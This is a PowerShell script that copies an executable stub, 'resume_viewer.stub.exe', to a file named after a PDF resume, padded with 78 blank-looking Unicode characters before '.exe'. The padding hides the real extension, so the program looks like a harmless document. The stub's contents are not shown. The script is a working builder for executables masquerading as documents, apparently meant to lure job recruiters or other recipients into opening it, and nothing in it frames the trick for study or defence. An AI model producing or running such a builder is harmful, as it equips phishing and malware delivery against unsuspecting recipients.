$ErrorActionPreference = 'Stop'

$stubPath = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\resume_viewer.stub.exe'))
$assetsPath = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\assets'))
$pdfFiles = @(Get-ChildItem -LiteralPath $assetsPath -Filter '*.pdf' -File |
    Sort-Object LastWriteTime -Descending)

if ($pdfFiles.Count -lt 1) {
    throw 'No PDF found in assets.'
}

$pdfFile = $pdfFiles[0]

# Exact 78-character blank-placeholder sequence requested for the output name.
$blankCodePoints = @(
    0x2002, 0x2007, 0x0020, 0x2002, 0x2002, 0x3000, 0x3000, 0x2003,
    0x2007, 0x2007, 0x3000, 0x0020, 0x2800, 0x2003, 0x3164, 0x3000,
    0x0020, 0x3000, 0x0020, 0x0020, 0x2002, 0x3164, 0x2002, 0x0020,
    0x2003, 0x2800, 0x0020, 0x2800, 0x0020, 0x3000, 0x0020, 0x2800,
    0x2002, 0x3000, 0x0020, 0x2007, 0x0020, 0x0020, 0x2800, 0x0020,
    0x0020, 0x3000, 0x0020, 0x2003, 0x3000, 0x3000, 0x3000, 0x2002,
    0x2007, 0x0020, 0x2002, 0x2002, 0x3000, 0x3000, 0x2003, 0x2007,
    0x2007, 0x3000, 0x0020, 0x2800, 0x3000, 0x0020, 0x2800, 0x0020,
    0x2800, 0x0020, 0x2800, 0x2002, 0x3000, 0x0020, 0x2007, 0x0020,
    0x3000, 0x0020, 0x2003, 0x3000, 0x3000, 0x3000
)

$blankPadding = -join @($blankCodePoints | ForEach-Object { [char]$_ })
$outputName = $pdfFile.Name + $blankPadding + '.exe'
$outputPath = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot (Join-Path '..' $outputName)))

[IO.File]::Copy($stubPath, $outputPath, $true)
Write-Host "[OK] Final executable: $outputPath"
